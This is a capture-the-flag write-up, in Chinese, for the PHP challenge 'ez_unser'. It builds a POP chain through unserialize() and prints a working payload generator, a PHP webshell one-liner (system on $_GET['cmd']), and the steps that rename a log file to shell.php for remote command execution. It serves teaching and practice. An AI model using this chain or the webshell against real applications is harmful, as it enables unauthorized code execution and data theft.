# ez_unser

## 题目简述

PHP 入口直接对 POST 参数执行 `unserialize($_POST['data'])`，并提供一组可串联的魔术方法。决定利用方式的两个终点为：

```php
class Mamba {
    public function Evil() {
        $filename = time().".log";
        file_put_contents($filename, $_POST["content"]);
        echo $filename;
    }
}

class Out {
    public function __call($name, $arguments) {
        $o = "./".str_replace("..", "第五人格", $_POST["o"]);
        $n = $_POST["n"];
        rename($o, $n);
    }
}
```

`Mamba::Evil()` 能写入任意内容，但文件名固定为时间戳加 `.log`；`Out::__call()` 能把当前目录中的文件重命名。两条链组合后即可先写入 PHP 内容，再把日志文件改名为可解析的 `.php` 文件。

## 解题过程

### 魔术方法触发链

反序列化 `Man` 时自动调用 `__wakeup()`。对象在 `str_split()`、字符串拼接、未定义属性、`var_dump()` 和未定义方法调用中依次触发后续魔术方法：

```text
Man::__wakeup
  -> What::__toString
  -> Can::__get
  -> I::__debugInfo
```

写文件时令 `I::$name` 指向 `Say`，再令 `Say::$evil` 指向 `Mamba`：

```text
I::__debugInfo -> Say::__call -> Mamba::Evil
```

重命名时令 `I::$name` 直接指向 `Out`，调用不存在的 `say()` 时触发：

```text
I::__debugInfo -> Out::__call
```

### 生成两条序列化数据

本地类只需要保持类名和私有属性名一致；方法体不会进入序列化数据，目标服务反序列化后使用的是服务端类定义。

```php
<?php
class Man {
    private $name;
    public function __construct($value) { $this->name = $value; }
}
class What {
    private $Kun;
    public function __construct($value) { $this->Kun = $value; }
}
class Can {
    private $Hobby;
    public function __construct($value) { $this->Hobby = $value; }
}
class I {
    private $name;
    public function __construct($value) { $this->name = $value; }
}
class Say {
    private $evil;
    public function __construct($value) { $this->evil = $value; }
}
class Mamba {}
class Out {}

function prefix($tail) {
    return new Man(new What(new Can($tail)));
}

$write = prefix(new I(new Say(new Mamba())));
$rename = prefix(new I(new Out()));

echo "write=" . urlencode(serialize($write)) . PHP_EOL;
echo "rename=" . urlencode(serialize($rename)) . PHP_EOL;
```

第一次请求提交 `write` 序列化数据，并把 `content` 设置为 PHP WebShell，例如：

```php
<?php system($_GET['cmd']); ?>
```

响应会回显新建的时间戳日志名。第二次请求提交 `rename` 序列化数据，同时令 `o` 为该日志名、`n` 为 `shell.php`。这里不需要目录穿越，只是在当前目录内改名。

最后访问 `shell.php?cmd=env`，从容器环境变量中读取 flag。

```text
0xGame{Pop_Chains_Is_Interesting!}
```

## 方法总结

- 核心技巧：构造 PHP POP 链，分别获得任意内容写入和同目录文件重命名两个原语，再组合为可执行 PHP 文件。
- 识别信号：入口存在无约束 `unserialize()`，并且类中出现 `__wakeup`、`__toString`、`__get`、`__debugInfo`、`__call` 等可连续触发的魔术方法。
- 复用要点：先画出属性类型和触发条件，再寻找文件写入、删除、重命名或命令执行终点；本地生成器只需复现序列化所需的类名与属性可见性。
